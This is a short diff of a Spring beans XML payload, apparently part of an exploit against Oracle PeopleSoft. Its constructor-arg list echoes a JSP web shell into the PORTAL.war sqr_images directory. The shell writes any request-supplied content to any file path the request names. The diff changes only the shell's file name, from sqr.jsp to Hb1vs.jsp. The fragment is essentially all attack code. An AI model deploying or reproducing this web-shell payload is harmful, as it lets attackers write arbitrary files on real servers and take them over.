@@ -12,7 +12,7 @@ http://www.springframework.org/schema/beans/spring-beans.xsd
             <value>echo</value>
             <value><![CDATA[<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream("./"+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>]]></value> 
             <value>></value>
-            <value>./applications/peoplesoft/PORTAL.war/sqr_images/sqr.jsp</value>
+            <value>./applications/peoplesoft/PORTAL.war/sqr_images/Hb1vs.jsp</value>
         </list>
 </constructor-arg>
 
